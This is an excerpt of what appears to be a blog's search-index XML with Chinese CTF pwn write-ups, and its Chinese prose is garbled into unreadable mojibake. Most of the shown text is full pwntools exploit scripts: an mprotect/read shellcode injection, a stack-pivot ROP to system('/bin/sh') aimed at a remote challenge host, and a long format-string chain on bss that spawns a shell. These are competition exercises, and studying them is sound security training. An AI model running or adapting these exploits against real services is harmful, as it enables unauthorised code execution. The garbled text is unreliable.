‡å‡†I&#x2F;Oå‡½æ•°è‡ªåŠ¨flush(ä¾‹å¦‚ç¼“å†²åŒºæ»¡çš„æ—¶å€™);æˆ–è€…æˆ‘ä»¬è°ƒç”¨fflushå‡½æ•°ã€‚</p><p>2.è¡Œç¼“å†²</p><p>åœ¨è¿™ç§æƒ…å†µä¸‹,åªæœ‰åœ¨è¾“å…¥&#x2F;è¾“å‡ºä¸­é‡åˆ°æ¢è¡Œç¬¦çš„æ—¶å€™,æ‰ä¼šæ‰§è¡Œå®é™…çš„I&#x2F;Oæ“ä½œã€‚è¿™å…è®¸æˆ‘ä»¬ä¸€æ¬¡å†™ä¸€ä¸ªå­—ç¬¦,ä½†æ˜¯åªæœ‰åœ¨å†™å®Œä¸€è¡Œä¹‹åæ‰åšI&#x2F;Oæ“ä½œã€‚ä¸€èˆ¬çš„,æ¶‰åŠåˆ°ç»ˆç«¯çš„æµâ€“ä¾‹å¦‚æ ‡å‡†è¾“å…¥(stdin)å’Œæ ‡å‡†è¾“å‡º(stdout)â€“æ˜¯è¡Œç¼“å†²çš„ã€‚</p><p>3.æ— ç¼“å†²</p><p>æ ‡å‡†I&#x2F;Oåº“ä¸ç¼“å­˜å­—ç¬¦ã€‚éœ€è¦æ³¨æ„çš„æ˜¯,æ ‡å‡†åº“ä¸ç¼“å­˜å¹¶ä¸æ„å‘³ç€æ“ä½œç³»ç»Ÿæˆ–è€…è®¾å¤‡é©±åŠ¨ä¸ç¼“å­˜ã€‚</p><p><strong>ç¼“å†²åŒºåˆ·æ–°</strong></p><ul><li>ç¼“å†²åŒºæ»¡æ—¶;</li><li>æ‰§è¡Œflushè¯­å¥ï¼Œå³ä½¿ç”¨ç‰¹å®šå‡½æ•°åˆ·æ–°ç¼“å†²åŒº;</li><li>æ‰§è¡Œendlè¯­å¥ï¼Œå³è¡Œç¼“å†²åŒºé‡åˆ°å›è½¦æ—¶(å³â€™\nâ€™);</li><li>å…³é—­æ–‡ä»¶ã€‚</li></ul></blockquote><p>gdbè®¡ç®—å‡ºåç§»ï¼Œæ‰¾å‡ºåˆé€‚çš„gadget</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-06-11%20225733.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">45</span>+mprotectåœ°å€+gadget+å‚æ•°addr+å‚æ•°<span class="built_in">len</span>+å‚æ•°prot </span><br><span class="line"><span class="comment">#mprotectå‡½æ•°ä¿®æ”¹gotè¡¨æƒé™ä¸ºå¯è¯»å¯å†™å¯æ‰§è¡Œ</span></span><br><span class="line">payload1+=readåœ°å€+gadget+å‚æ•°fd+å‚æ•°buf+å‚æ•°size</span><br><span class="line">payload1+=ä¿®æ”¹çš„å†…å­˜åœ°å€ <span class="comment">#è¿”å›åœ°å€ä¸ºå°†è¦æ‰§è¡Œshellcodeçš„åœ°å€</span></span><br><span class="line">payload2=asm(shellcraft.sh())</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.sendline(payload2)</span><br></pre></td></tr></table></figure><p>expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./not_&#x27;</span>)</span><br><span class="line">mprotect=<span class="number">0x806ED40</span></span><br><span class="line">got_addr=<span class="number">0x80EB000</span></span><br><span class="line">ebp_esi_edi=<span class="number">0x0809e3e5</span></span><br><span class="line">read_addr=<span class="number">0x806E200</span></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">45</span>+p32(mprotect)+p32(ebp_esi_edi)+p32(got_addr)+p32(<span class="number">0x1000</span>)+p32(<span class="number">0x7</span>)</span><br><span class="line">payload+=p32(read_addr)+p32(ebp_esi_edi)+p32(<span class="number">0</span>)+p32(got_addr)+p32(<span class="number">0xfff</span>)+p32(got_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> stack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023ssctf-åˆèµ›</title>
      <link href="/posts/25731/"/>
      <url>/posts/25731/</url>
      
        <content type="html"><![CDATA[<h2 id="shanxi"><a href="#shanxi" class="headerlink" title="shanxi"></a>shanxi</h2><p>æº¢å‡ºçš„å­—èŠ‚æ•°ä¸å¤Ÿï¼Œåˆ©ç”¨æ ˆè¿ç§»è·å¾—è¶³å¤Ÿç©ºé—´æ„é€ ropé“¾</p><p>expå¦‚ä¸‹:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&quot;60.204.130.55&quot;</span>,<span class="number">10001</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;choice :\n&#x27;</span>)</span><br><span class="line">payload=<span class="built_in">str</span>(<span class="number">2</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;%37$p%10$p%19$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libc_start_main=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">128</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_start_main))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">stack_addr=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x30</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">main_addr=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_addr))</span><br><span class="line">code_base = main_addr - <span class="number">0x12eb</span></span><br><span class="line">offset=libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">libcbase=libc_start_main-offset</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libcbase))</span><br><span class="line">sys = libcbase + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libcbase + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">pop_rdi_ret=<span class="number">0x1433</span> + code_base</span><br><span class="line">leave_ret = <span class="number">0x127f</span> + code_base</span><br><span class="line">ret = <span class="number">0x101a</span> + code_base</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;choice :\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">payload=p64(pop_rdi_ret)+p64(binsh)+p64(sys)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload += p64(stack_addr-<span class="number">0x28</span>) + p64(leave_ret)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Mountain\n&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b read&#x27;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ez-printf"><a href="#ez-printf" class="headerlink" title="ez_printf"></a>ez_printf</h2><p>è€ƒå¯Ÿäº†åœ¨bssæ®µçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼ŒåŸç†ä¸å¤æ‚ï¼Œå°±æ˜¯æœ‰ç‚¹éº»çƒ¦</p><p>expå¦‚ä¸‹:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;TokameinE_is_the_best_pwner\x00&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *$rebase(0x1130)&#x27;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;%11$p.%49$p.%8$p.&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">base=<span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;.&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)-<span class="number">134</span>-<span class="number">0x1595</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;base:&quot;</span>+<span class="built_in">hex</span>(base))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">offset=libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(offset))</span><br><span class="line">true=<span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;.&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)-<span class="number">128</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(true))</span><br><span class="line">libcbase=true-offset</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libcbase:&quot;</span>+<span class="built_in">hex</span>(libcbase))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">stack_addr=<span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;.&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;stack_addr:&quot;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"><span class="comment">#p.recvuntil(b&#x27;0x&#x27;)</span></span><br><span class="line"><span class="comment">#stack_addr_2=int(p.recvuntil(b&#x27;.&#x27;,drop=True),16)</span></span><br><span class="line"><span class="comment">#print(&quot;stack_addr_2:&quot;+hex(stack_addr_2))</span></span><br><span class="line">bin_sh=<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))+libcbase</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;bin_sh:&quot;</span>+<span class="built_in">hex</span>(bin_sh))</span><br><span class="line">sys_addr=libc.symbols[<span class="string">&#x27;system&#x27;</span>]+libcbase</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sys_addr:&quot;</span>+<span class="built_in">hex</span>(sys_addr))</span><br><span class="line">pop_rdi_ret=base+<span class="number">0x16c3</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;pop_rdi_ret:&quot;</span>+<span class="built_in">hex</span>(pop_rdi_ret))</span><br><span class="line">ret=base+<span class="number">0x101a</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;base:&quot;</span>+<span class="built_in">hex</span>(ret))</span><br><span class="line">stack_1=stack_addr+<span class="number">0x10</span></span><br><span class="line">stack_2=stack_addr-<span class="number">0x8</span></span><br><span class="line">stack_3=stack_addr+<span class="number">0x8</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;say?\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_1&amp;<span class="number">0xffff</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_addr&amp;<span class="number">0xffff</span>))</span><br><span class="line"><span class="keyword">if</span> (stack_1&amp;<span class="number">0xffff</span>)&gt;=(stack_addr&amp;<span class="number">0xffff</span>):</span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(stack_addr&amp;<span class="number">0xffff</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%51$hn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack_1&amp;<span class="number">0xffff</span>)-(stack_addr&amp;<span class="number">0xffff</span>)).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%33$hn&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(stack_1&amp;<span class="number">0xffff</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%33$hn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack_addr&amp;<span class="number">0xffff</span>)-(stack_1&amp;<span class="number">0xffff</span>)).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%51$hn&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;say?\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(sys_addr&amp;<span class="number">0xffff</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bin_sh&amp;<span class="number">0xffff</span>))</span><br><span class="line"><span class="keyword">if</span> (sys_addr&amp;<span class="number">0xffff</span>)&gt;=(bin_sh&amp;<span class="number">0xffff</span>):</span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(bin_sh&amp;<span class="number">0xffff</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%65$hn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((sys_addr&amp;<span class="number">0xffff</span>)-(bin_sh&amp;<span class="number">0xffff</span>)).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%63$hn&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(sys_addr&amp;<span class="number">0xffff</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%63$hn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((bin_sh&amp;<span class="number">0xffff</span>)-(sys_addr&amp;<span class="number">0xffff</span>)).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%65$hn&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;say?\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>((stack_1+<span class="number">2</span>)&amp;<span class="number">0xffff</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>((stack_addr+<span class="number">2</span>)&amp;<span class="number">0xffff</span>))</span><br><span class="line"><span class="keyword">if</span> ((stack_1+<span class="number">2</span>)&amp;<span class="number">0xffff</span>)&gt;=((stack_addr+<span class="number">2</span>)&amp;<span class="number">0xffff</span>):</span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack_addr+<span class="number">2</span>)&amp;<span class="number">0xffff</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%51$hn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(((stack_1+<span class="number">2</span>)&amp;<span class="number">0xffff</span>)-((stack_addr+<span class="number">2</span>)&amp;<span class="number">0xffff</span>)).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%33$hn&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack_1+<span class="number">2</span>)&amp;<span class="number">0xffff</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%33$hn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(((stack_addr+<span class="number">2</span>)&amp;<span class="number">0xffff</span>)-((stack_1+<span class="number">2</span>)&amp;<span class="number">0xffff</span>)).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%51$hn&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;say?\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>((sys_addr&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>((bin_sh&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>))</span><br><span class="line"><span class="keyword">if</span> ((sys_addr&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>)&gt;=((bin_sh&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>):</span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((bin_sh&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%65$hn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(((sys_addr&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>)-((bin_sh&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>)).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%63$hn&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((sys_addr&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%63$hn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(((bin_sh&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>)-((sys_addr&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>)).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%65$hn&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;say?\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>((stack_1+<span class="number">4</span>)&amp;<span class="number">0xffff</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>((stack_addr+<span class="number">4</span>)&amp;<span class="number">0xffff</span>))</span><br><span class="line"><span class="keyword">if</span> ((stack_1+<span class="number">4</span>)&amp;<span class="number">0xffff</span>)&gt;=((stack_addr+<span class="number">4</span>)&amp;<span class="number">0xffff</span>):</span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack_addr+<span class="number">4</span>)&amp;<span class="number">0xffff</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%51$hn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(((stack_1+<span class="number">4</span>)&amp;<span class="number">0xffff</span>)-((stack_addr+<span class="number">4</span>)&amp;<span class="number">0xffff</span>)).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%33$hn&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack_1+<span class="number">4</span>)&amp;<span class="number">0xffff</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%33$hn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(((stack_addr+<span class="number">4</span>)&amp;<span class="number">0xffff</span>)-((stack_1+<span class="number">4</span>)&amp;<span class="number">0xffff</span>)).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%51$hn&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;say?\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>((sys_addr&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xffff</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>((bin_sh&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xffff</span>))</span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((bin_sh&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xffff</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%65$hn&#x27;</span>+<span class="string">b&#x27;%63$hn&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;say?\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(stack_2&amp;<span class="number">0xffff</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%33$hn&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;say?\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(pop_rdi_ret&amp;<span class="number">0xffff</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%63$hn&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;say?\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(stack_3&amp;<span class="number">0xffff</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%33$hn&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;say?\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(ret&amp;<span class="number">0xffff</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%63$hn&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;say?\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(stack_3&amp;<span class="number">0xffff</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%33$hn&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;say?\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(ret&amp;<span class="number">0xffff</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%63$hn&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>32format-bss</title>
      <link href="/posts/35316/"/>
      <url>/posts/35316/</url>
      
